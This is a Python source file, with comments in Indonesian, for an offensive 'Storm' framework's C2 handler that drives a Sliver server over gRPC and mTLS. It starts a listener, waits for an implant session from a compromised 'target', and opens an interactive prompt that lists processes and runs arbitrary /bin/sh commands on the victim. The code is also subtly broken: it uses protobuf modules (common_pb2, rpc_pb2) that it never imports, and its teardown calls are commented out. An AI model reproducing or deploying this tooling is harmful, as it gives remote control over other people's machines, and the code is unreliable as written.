import grpc
import time
import smf

# Import protobuf hasil compile (sesuaikan path relatifmu jika berbeda)
from internal.proto.rpc import services_pb
from internal.proto.rpc import services_pb_grpc

# ==========================================
# STATE INTERNAL HANDLER (Terisolasi)
# ==========================================
_SESSION_ID = None
_IS_C2_ACTIVE = False


# ==========================================
# GRP/mTLS CONNECTION INITIATOR
# ==========================================
def _get_grpc_client():
    """
    Membangun jalur komunikasi aman ke sliver-server menggunakan CA Storm.
    """
    # Sesuaikan path ini ke tempat kamu menyimpan aset kriptografi Storm kamu
    STORM_CA_CERT = "data/smf_ca.crt"
    OPERATOR_KEY = "data/smf_ca.key"

    try:
        # Load aset kriptografi
        with open(STORM_CA_CERT, "rb") as f:
            root_ca = f.read()
        with open(OPERATOR_KEY, "rb") as f:
            client_key = f.read()

        # Bangun kredensial TLS
        credentials = grpc.ssl_channel_credentials(
            root_certificates=root_ca, private_key=client_key
        )

        # Buka socket gRPC ke default port Sliver Server (31337)
        channel = grpc.secure_channel("127.0.0.1:31337", credentials)
        return services_pb_grpc.SliverRPCStub(channel)
    except FileNotFoundError as e:
        smf.printd("[-] Missing cryptography assets", e, level="ERROR")
        return None


# ==========================================
# CORE PIPELINE: MODULES -> HANDLER -> TARGET
# ==========================================
def process_attack_flow(module_data):
    """
    Entry point tunggal yang dipanggil oleh modul (seperti reverse_https.py).
    Mengunci terminal dari awal listener hidup sampai C2 session mati.
    """
    global _SESSION_ID, _IS_C2_ACTIVE

    rpc_client = _get_grpc_client()
    if not rpc_client:
        return

    # 1. Ekstraksi Opsi Modul
    lhost = module_data.get("LHOST", "0.0.0.0")
    lport = int(module_data.get("LPORT", "8080"))

    # 2. Nyalakan Listener di Backend gRPC
    try:
        smf.printd(f"Deploying MTLS listener on backend -> {lhost}:{lport}", level="INFO")
        # Note: Sliver biasanya menggunakan camel case untuk method RPC-nya
        req = services_pb.StartMTLSListenerReq(Host=lhost, Port=lport)
        rpc_client.StartMTLSListener(req)
    except grpc.RpcError as e:
        smf.printd(f"Backend listener failed", e.details(), level="ERROR")
        return

    # 3. KUNCI LOOP 1: Polling Koneksi Masuk
    smf.printf("Listener active. Scanning connection queue (Ctrl+C to abort)...")
    empty_req = (
        common_pb2.Empty()
    )  # Sliver butuh objek 'Empty' untuk parameter fungsi tanpa input

    while True:
        try:
            # Minta daftar sesi aktif ke server
            res = rpc_client.GetSessions(empty_req)
            if len(res.Sessions) > 0:
                # Tangkap ID sesi terakhir yang masuk
                _SESSION_ID = res.Sessions[-1].ID
                break
            time.sleep(1)  # Delay agar tidak DDoS lokal
        except KeyboardInterrupt:
            smf.printf("\n[handler] [-] Scan aborted by operator.")
            _teardown_backend(rpc_client, lport)
            return

    # 4. KUNCI LOOP 2: REPL C2 (Terminal Hijacked)
    _IS_C2_ACTIVE = True
    smf.printf(f"\n[handler] [+] TARGET CAUGHT! Session ID: {_SESSION_ID}")

    while _IS_C2_ACTIVE:
        try:
            c2_input = input(f"storm(c2-{_SESSION_ID}) > ").strip()
            if not c2_input:
                continue
            if c2_input == "exit":
                smf.printf(
                    "[*] Exit command received. Terminating implant connection..."
                )
                _IS_C2_ACTIVE = False
                break

            _send_implant_command(_SESSION_ID, c2_input, rpc_client)

        except (KeyboardInterrupt, EOFError):
            print("\n[handler] [*] Force exiting C2 terminal...")
            _IS_C2_ACTIVE = False
            break

    # 5. FASE CLEANUP (Unlock)
    print(f"[handler] [*] Destroying active state for session {_SESSION_ID}...")
    _teardown_backend(rpc_client, lport)

    # Reset State
    _SESSION_ID = None
    print("[handler] [+] Handler sequence completed. Storm Core REPL unlocked.")


# ==========================================
# COMMAND ROUTER (Handler -> Implant)
# ==========================================
def _send_implant_command(session_id, c2_input, rpc_client):
    parts = c2_input.split()
    cmd = parts[0]
    args = parts[1:]

    try:
        if cmd == "ps":
            # Struktur asli request list proses
            req = rpc_pb2.GenericPayloadReq(SessionID=session_id)
            res = rpc_client.GetProcessList(req)
            print(res.Output)

        elif cmd == "shell":
            if not args:
                print("Usage: shell <command>")
                return
            shell_req = rpc_pb2.ShellReq(SessionID=session_id, Path="/bin/sh", Args=args)
            res = rpc_client.ExecuteShell(shell_req)
            if res.Stderr:
                print(f"Error: {res.Stderr}")
            print(res.Stdout)

        else:
            print(f"[-] Command '{cmd}' is not mapped in Storm Handler yet.")
    except grpc.RpcError as e:
        print(f"[-] Command transmission failed: {e.details()}")


# ==========================================
# BACKEND CLEANUP
# ==========================================
def _teardown_backend(rpc_client, lport):
    """
    Membersihkan listener dan membunuh sesi yang masih nyangkut di memori sliver-server
    """
    global _SESSION_ID
    try:
        if _SESSION_ID:
            print(f"[handler] [*] Sending kill signal to session {_SESSION_ID}...")
            # req_kill = rpc_pb2.SessionReq(SessionID=_SESSION_ID)
            # rpc_client.KillSession(req_kill)

        print(f"[handler] [*] Stopping backend listener on port {lport}...")
        # req_stop = rpc_pb2.StopListenerReq(Port=lport)
        # rpc_client.StopMTLSListener(req_stop)
    except grpc.RpcError as e:
        print(f"[handler] [-] Cleanup warning: {e.details()}")
